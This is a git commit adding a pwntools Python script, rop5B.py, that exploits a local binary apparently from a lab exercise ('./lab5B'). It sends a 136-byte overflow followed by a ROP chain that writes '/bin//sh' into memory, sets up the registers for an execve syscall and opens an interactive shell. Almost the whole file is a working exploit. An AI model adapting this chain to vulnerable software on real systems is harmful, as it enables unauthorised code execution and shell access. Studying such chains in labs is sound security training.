7877a655ddbc729ca5fe31a726ee1a2632941555
A22H67 <76444803+A22H67@users.noreply.github.com>
2020-12-30 00:37:04 +0700

    Add files via upload

---
+++ ropChain/rop5B.py
@@ -0,0 +1,34 @@
+from pwn import *
+rop=process("./lab5B")
+ui.pause()
+
+
+p=b'A'*136
+p += p64(0x00000000004078ce) # pop rsi ; ret
+p += p64(0x00000000004ab0e0) # @ .data
+p += p64(0x0000000000411e2c) # pop rax ; ret
+p += b'/bin//sh'
+p += p64(0x0000000000440591) # mov qword ptr [rsi], rax ; ret
+p += p64(0x00000000004078ce) # pop rsi ; ret
+p += p64(0x00000000004ab0e8) # @ .data + 8
+p += p64(0x00000000004394d0) # xor rax, rax ; ret
+p += p64(0x0000000000440591) # mov qword ptr [rsi], rax ; ret
+p += p64(0x00000000004017e6) # pop rdi ; ret
+p += p64(0x00000000004ab0e0) # @ .data
+p += p64(0x00000000004078ce) # pop rsi ; ret
+p += p64(0x00000000004ab0e8) # @ .data + 8
+p += p64(0x00000000004016fb) # pop rdx ; ret
+p += p64(0x00000000004ab0e8) # @ .data + 8
+p += p64(0x00000000004394d0) # xor rax, rax ; ret
+p +=p64(0x00000000004613b0) *59
+
+
+
+p+=p64(0x000000000040120b)
+#ropchain+="\x0b\x12\x40"
+rop.sendline(p)
+#ropchain=p32(0x0040120b) #return
+
+
+rop.sendline(p)
+rop.interactive()
